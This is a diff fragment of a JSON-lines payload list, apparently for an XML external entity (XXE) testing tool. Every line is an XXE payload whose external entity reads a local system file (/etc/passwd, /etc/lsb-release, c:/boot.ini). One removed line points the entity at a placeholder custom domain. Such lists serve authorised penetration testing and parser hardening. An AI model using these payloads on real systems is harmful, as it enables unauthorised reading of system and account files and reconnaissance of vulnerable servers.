@@ -3,4 +3,3 @@
 {"vector":"<!DOCTYPE docem [<!ELEMENT docem ANY ><!ENTITY xxe_canary_2 SYSTEM \"file:///etc/lsb-release\">]>","reference":"&xxe_canary_2;"}
 {"vector":"<!DOCTYPE docem [<!ELEMENT docem ANY ><!ENTITY xxe_canary_3 SYSTEM \"file:///etc/passwd\">]>","reference":"&xxe_canary_3;"}
 {"vector":"<!DOCTYPE docem [<!ELEMENT docem ANY ><!ENTITY xxe_canary_4 SYSTEM \"file:///c:/boot.ini\">]>","reference":"&xxe_canary_4;"}
-{"vector":"<!DOCTYPE docem [<!ELEMENT docem ANY ><!ENTITY xxe_canary_4 SYSTEM \"custom_domain_here\">]>","reference":"&xxe_canary_4;"}
